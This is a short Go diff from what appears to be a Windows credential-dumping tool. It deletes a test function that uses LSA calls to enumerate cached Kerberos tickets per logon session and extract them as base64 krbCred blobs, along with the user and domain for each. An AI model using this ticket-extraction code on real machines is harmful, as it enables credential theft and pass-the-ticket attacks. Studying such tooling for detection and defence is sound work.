@@ -14,9 +14,7 @@ import (
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	// testing
-	testing_lsa "github.com/ziggoon/gkirby/lsa"
-	testing_types "github.com/ziggoon/gkirby/types"
-	testing_helpers "github.com/ziggoon/gkirby/helpers"
+
 )
 type printableSecret interface {
 	PrintSecret(io.Writer)
@@ -208,63 +206,5 @@ func GetKerberosTickets() []map[string]interface{} {
 	}
 
 	return nil
-}
-
-func TestingTick() ([]map[string]interface{}, error) {
-	var ticketCache []map[string]interface{}
-	lsaHandle, err := testing_lsa.GetLsaHandle()
-	if err != nil {
-		return nil, err
-	}
-	kerberosString := testing_types.NewLSAString("kerberos")
-	authPackage, err := testing_lsa.GetAuthenticationPackage(lsaHandle, kerberosString)
-	if err != nil {
-		return nil, err
-	}
-	// list cached kerberos tickets in LSA
-	sessionCreds, err := testing_lsa.EnumerateTickets(lsaHandle, authPackage)
-	if err != nil {
-		return nil, err
-	}
-
-	//fmt.Printf("sessionCreds received: %v\n", sessionCreds)
-
-	ticketCache = make([]map[string]interface{}, 0)
-	for _, cred := range sessionCreds {
-		//fmt.Printf("sessionCred: \n%+v\n", cred)
-		for _, ticket := range cred.Tickets {
-
-			fmt.Printf("current process is SYSTEM: %t\n", testing_helpers.IsSystem())
-			// obtain raw ticket material
-			extractedTicket, err := testing_lsa.ExtractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
-			fmt.Printf("extractedTicket: %+v\n", extractedTicket)
-			if err != nil {
-				continue
-			}
-
-			// create map (hash table) to store cached kerberos tickets
-			ticket := map[string]interface{}{
-				"username":    cred.LogonSession.Username,
-				"domain":      cred.LogonSession.LogonDomain,
-				"logonId":     cred.LogonSession.LogonID.LowPart,
-				"serverName":  ticket.ServerName,
-				"serverRealm": ticket.ServerRealm,
-				"startTime":   ticket.StartTime.Format(time.RFC3339),
-				"endTime":     ticket.EndTime.Format(time.RFC3339),
-				"renewTime":   ticket.RenewTime.Format(time.RFC3339),
-				"flags":       ticket.TicketFlags.String(),
-				"encType":     ticket.EncryptionType,
-				"krbCred":     base64.StdEncoding.EncodeToString(extractedTicket),
-			}
-
-			ticketCache = append(ticketCache, ticket)
-		}
-	}
-
-	if len(ticketCache) > 0 {
-		return ticketCache, nil
-	}
-
-	return nil, nil
 }
 
